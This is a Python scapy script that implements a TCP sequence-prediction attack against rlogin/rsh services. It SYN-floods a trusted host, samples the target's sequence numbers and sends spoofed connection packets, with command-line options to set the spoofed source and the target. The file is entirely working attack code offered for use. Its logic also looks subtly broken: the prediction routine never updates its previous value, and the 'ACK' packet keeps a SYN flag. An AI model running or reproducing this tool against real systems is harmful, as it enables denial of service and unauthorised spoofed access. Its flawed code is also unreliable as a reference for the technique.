from scapy.all import *
from optparse import OptionParser


def syn_flood(src, tgt):
    for sport in range(1024, 1030):
        IPlayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=sport, dport=513)
        pkt = IPlayer / TCPlayer
        send(pkt)


def cat_tsn(tgt):
    seq_num = 0
    pre_num = 0
    dif_seq = 0
    for x in range(1, 5):
        if pre_num != 0:
            pre_num = seq_num
        pkt = IP(dst=tgt) / TCP()
        ans = sr1(pkt, verbose=0)
        seq_num = ans.getlayer(TCP).seq
        dif_seq = seq_num - pre_num
        print('[+] TCP Seq Difference: %s' % dif_seq)
    return dif_seq + seq_num


def spoof_con(src, tgt, ack):
    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514)
    syn_pkt = IPlayer / TCPlayer
    send(syn_pkt)

    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514, ack=ack)
    ack_pkt = IPlayer / TCPlayer
    send(ack_pkt)


def main():
    parser = OptionParser('usage%prog -s <src for SYN Flood> -S <src for spoofed connection> -t <target address>')
    parser.add_option('-s', dest='syn_spoof', type='string', help='specify src for SYN Flood')
    parser.add_option('-S', dest='src_spoof', type='string', help='specify src for spoofed connection')
    parser.add_option('-t', dest='tgt', type='string', help='specify target address')
    options, args = parser.parse_args()

    if options.syn_spoof is None or options.src_spoof is None or options.tgt is None:
        print(parser.usage)
        exit(0)
    else:
        syn_spoof = options.syn_spoof
        src_spoof = options.src_spoof
        tgt = options.tgt

    print('[+] Starting SYN Flood to suppress remote server')
    syn_flood(syn_spoof, src_spoof)

    print('[+] Calculating correct TCP sequence number')
    seq_num = cat_tsn(tgt) + 1
    print('[+] TCP sequence number: %s' % seq_num)

    print('[+] Spoofing connection')
    spoof_con(src_spoof, tgt, seq_num)
    print('[+] Done')


if __name__ == '__main__':
    main()